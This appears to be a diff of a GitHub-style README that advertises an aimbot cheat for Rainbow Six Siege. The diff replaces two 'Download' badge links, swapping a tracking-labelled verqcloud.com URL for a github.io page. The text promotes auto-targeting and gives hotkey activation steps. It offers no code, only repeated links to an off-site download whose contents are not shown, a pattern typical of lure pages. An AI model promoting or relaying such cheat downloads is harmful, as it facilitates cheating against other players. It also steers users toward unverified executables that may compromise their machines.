@@ -2,7 +2,7 @@
 
 The **Rainbow Six Siege Aim Bot** is a powerful tool designed to give players a competitive edge by automating the aiming process in **Rainbow Six Siege**. With its advanced features like **auto-targeting** and **precision shooting**, this aimbot enhances your accuracy and reaction time, ensuring that your shots hit their mark every time. Whether you're a beginner looking to improve your shooting skills or an experienced player wanting to dominate in tactical combat, this tool helps you perform at your best.
 
-[![Download R6S AimBot](https://img.shields.io/badge/Download-R6S%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download R6S AimBot](https://img.shields.io/badge/Download-R6S%20AimBot-blueviolet)](https://rainbow-six-siege-aim-bot.github.io/.github/)
 
 ## Features
 
@@ -23,4 +23,4 @@ The **Rainbow Six Siege Aim Bot** is a powerful tool designed to give players a 
 4. Launch **Rainbow Six Siege** and activate the aimbot using the designated hotkey.
 5. Adjust the aimbot's settings (sensitivity, FOV, target area) to fit your preferences and playstyle.
 
-[![Download R6S AimBot](https://img.shields.io/badge/Download-R6S%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download R6S AimBot](https://img.shields.io/badge/Download-R6S%20AimBot-blueviolet)](https://rainbow-six-siege-aim-bot.github.io/.github/)
